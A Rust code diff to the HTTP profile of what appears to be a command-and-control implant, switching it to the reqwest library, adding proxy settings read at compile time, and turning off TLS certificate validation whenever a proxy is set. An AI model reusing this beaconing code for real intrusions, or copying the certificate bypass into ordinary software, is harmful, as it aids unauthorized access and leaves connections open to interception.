@@ -1,5 +1,7 @@
 use crate::profiles::C2Profile;
 use std::error::Error;
+use reqwest::blocking::Client;
+use reqwest::Proxy;
 
 /// Struct holding information for the HTTP profile
 pub struct HTTPProfile {
@@ -52,31 +54,39 @@ impl C2Profile for HTTPProfile {
 /// * `url` - URL for the post request
 /// * `body` - Body of the post request
 fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
-    // Create a new post request with the configured user agent
-    let mut req = minreq::post(url)
-        .with_header("User-Agent", profilevars::useragent())
-        .with_body(body);
+    // Create a new HTTP client
+    let mut client_builder = Client::builder();
+    if let Some(proxy_url) = profilevars::proxy_settings() {
+        client_builder = client_builder.proxy(Proxy::all(&proxy_url)?);
+        client_builder = client_builder.danger_accept_invalid_certs(true);
+    }
+
+
+    let client = client_builder.build()?;
+
+
+    // Create a new post request with the configured user agent and body
+    let mut request = client.post(url)
+        .header("User-Agent", profilevars::useragent())
+        .body(body.to_string());
 
     // Add any additional headers
     if let Some(headers) = profilevars::headers() {
         for (key, val) in headers.iter() {
-            req = req.with_header(key, val);
+            request = request.header(key, val);
         }
     }
 
-    // Send the post request
-    let res = req.send()?;
+    // Send the post request and get the response
+    let response = request.send()?;
 
     // Check the status code
-    if res.status_code != 200 {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::ConnectionRefused,
-            "Failed to make post request",
-        )
-        .into());
+    
+    if response.status().as_u16() != 200 { 
+        return Err(format!("Failed to make post request: HTTP {}", response.status()).into());
     }
 
-    Ok(res.as_str()?.to_string())
+    Ok(response.text()?)
 }
 
 /// Configuration variables specific to the HTTP C2 profile
@@ -154,5 +164,15 @@ pub mod profilevars {
         // Grab the AES information from the environment variable `AESPSK`
         let aes: Aespsk = serde_json::from_str(env!("AESPSK")).unwrap();
         aes.enc_key
+    }
+    /// Helper function to get the proxy configurations for the agent
+    pub fn proxy_settings() -> Option<String> {
+        match (option_env!("proxy_host"), option_env!("proxy_port")) {
+            (Some(host), Some(port)) if !host.is_empty() && !port.is_empty() => {
+                Some(format!("{}:{}", host, port))
+            },
+            _ => None,
+        }
+
     }
 }
